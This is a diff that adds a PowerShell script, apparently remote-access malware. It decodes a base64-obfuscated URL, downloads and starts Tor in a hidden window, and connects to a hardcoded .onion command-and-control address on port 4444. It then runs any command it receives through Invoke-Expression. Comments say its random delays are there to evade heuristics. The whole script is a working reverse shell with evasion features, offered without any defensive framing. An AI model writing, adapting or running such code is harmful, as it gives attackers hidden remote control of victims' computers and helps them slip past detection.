@@ -1,0 +1,155 @@
+# Helper: decode base64 string
+function DecodeB64([string]$input) {
+    return [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($input))
+}
+
+# Compose Tor URL dynamically (obfuscated)
+$part1 = "aHR0cHM6Ly9hcmNoaXZlLnRvcnByb2plY3Qub3JnL3Rvci1wYWNrYWdlLWFyY2hpdmUvdG9yYnJvd3Nlci8xNC41LjQvdG9yLWV4cGVydC1idW5kbGQtd2luZG93cy14ODYtNjQtMTQuNS40LnRhci5neg=="
+$torUrl = DecodeB64 $part1
+
+# Paths
+$temp = $env:TEMP
+$downloadFile = Join-Path $temp "tor_dl.tar.gz"
+$extractDir = Join-Path $temp "tor_folder"
+$torExe = Join-Path $extractDir "tor.exe"
+$torrcFile = Join-Path $extractDir "torrc"
+$dataDir = Join-Path $extractDir "Data"
+
+# Download & extract Tor Expert Bundle if not present
+if (-not (Test-Path $torExe)) {
+    Write-Host "[*] Downloading Tor Expert Bundle..."
+    Invoke-WebRequest -Uri $torUrl -OutFile $downloadFile -UseBasicParsing
+
+    Write-Host "[*] Extracting Tor Expert Bundle..."
+    tar -xvf $downloadFile -C $temp | Out-Null
+}
+
+# Ensure DataDirectory exists
+if (-not (Test-Path $dataDir)) {
+    New-Item -Path $dataDir -ItemType Directory | Out-Null
+}
+
+# Create torrc config dynamically
+$torrcContent = @"
+SocksPort 9050
+DataDirectory $dataDir
+Log notice stdout
+"@
+$torrcContent | Set-Content -Path $torrcFile -Encoding ASCII
+
+# Start Tor process hidden
+Write-Host "[*] Starting Tor..."
+Start-Process -FilePath $torExe -ArgumentList "-f `"$torrcFile`"" -WindowStyle Hidden | Out-Null
+
+# Wait random time between 20-30 sec for bootstrap (random delay)
+$waitTime = Get-Random -Minimum 20 -Maximum 30
+Write-Host "[*] Waiting $waitTime seconds for Tor to bootstrap..."
+Start-Sleep -Seconds $waitTime
+
+# SOCKS5 connect function with some delay in handshake
+function Connect-Socks5 {
+    param(
+        [string]$proxyHost = "127.0.0.1",
+        [int]$proxyPort = 9050,
+        [string]$destHost,
+        [int]$destPort
+    )
+
+    $client = New-Object System.Net.Sockets.TcpClient
+    $client.Connect($proxyHost, $proxyPort)
+    $stream = $client.GetStream()
+
+    Start-Sleep -Milliseconds (Get-Random -Minimum 100 -Maximum 500)
+
+    # SOCKS5 handshake - no auth
+    $stream.Write(@(0x05,0x01,0x00), 0, 3)
+    $resp = New-Object byte[] 2
+    $stream.Read($resp, 0, 2) | Out-Null
+    if ($resp[1] -ne 0x00) { throw "Proxy auth required, unsupported." }
+
+    Start-Sleep -Milliseconds (Get-Random -Minimum 100 -Maximum 300)
+
+    # Connect request to destHost
+    $hostBytes = [System.Text.Encoding]::ASCII.GetBytes($destHost)
+    $req = New-Object byte[] (7 + $hostBytes.Length)
+    $req[0] = 0x05
+    $req[1] = 0x01
+    $req[2] = 0x00
+    $req[3] = 0x03
+    $req[4] = $hostBytes.Length
+    $hostBytes.CopyTo($req, 5)
+    $req[-2] = [byte]($destPort -shr 8)
+    $req[-1] = [byte]($destPort -band 0xFF)
+
+    $stream.Write($req, 0, $req.Length)
+
+    $resp2 = New-Object byte[] 10
+    $stream.Read($resp2, 0, 10) | Out-Null
+    if ($resp2[1] -ne 0x00) { throw "SOCKS5 connection failed with code $($resp2[1])" }
+
+    return $client
+}
+
+# Onion C2 details
+$onionAddress = "iku4ug564pjvmstzn56swztu3t3uc2w6u5awijqtcuqa43emu4i4zcad.onion"
+$onionPort = 4444
+$proxyHost = "127.0.0.1"
+$proxyPort = 9050
+
+# Attempt connection with retry and backoff
+$maxRetries = 3
+$attempt = 0
+$client = $null
+while ($attempt -lt $maxRetries) {
+    try {
+        $client = Connect-Socks5 -proxyHost $proxyHost -proxyPort $proxyPort -destHost $onionAddress -destPort $onionPort
+        break
+    } catch {
+        Write-Host "[!] Connection attempt $($attempt + 1) failed: $_"
+        $attempt++
+        Start-Sleep -Seconds (5 * $attempt)
+    }
+}
+if (-not $client) {
+    Write-Host "[!] Could not connect to C2 after $maxRetries attempts, exiting."
+    exit
+}
+
+$stream = $client.GetStream()
+$reader = New-Object System.IO.StreamReader($stream)
+$writer = New-Object System.IO.StreamWriter($stream)
+$writer.AutoFlush = $true
+
+# Main command loop
+while ($true) {
+    try {
+        $cmd = $reader.ReadLine()
+        if ([string]::IsNullOrEmpty($cmd) -or $cmd -eq "exit") { break }
+
+        # Whitelisted commands
+        switch -Regex ($cmd) {
+            '^dir' { $output = Get-ChildItem | Out-String }
+            '^whoami' { $output = whoami | Out-String }
+            '^ipconfig' { $output = ipconfig | Out-String }
+            default {
+                # As fallback, safely try to run with Invoke-Expression with delay to slow execution
+                Start-Sleep -Milliseconds (Get-Random -Minimum 500 -Maximum 1500)
+                try {
+                    $output = Invoke-Expression $cmd 2>&1 | Out-String
+                } catch {
+                    $output = "Command failed or disallowed."
+                }
+            }
+        }
+    } catch {
+        $output = "Error: $($_.Exception.Message)"
+    }
+
+    $output += "`n__END__"
+    $writer.WriteLine($output)
+
+    # Random sleep to slow command processing and evade heuristics
+    Start-Sleep -Milliseconds (Get-Random -Minimum 500 -Maximum 2000)
+}
+
+$client.Close()
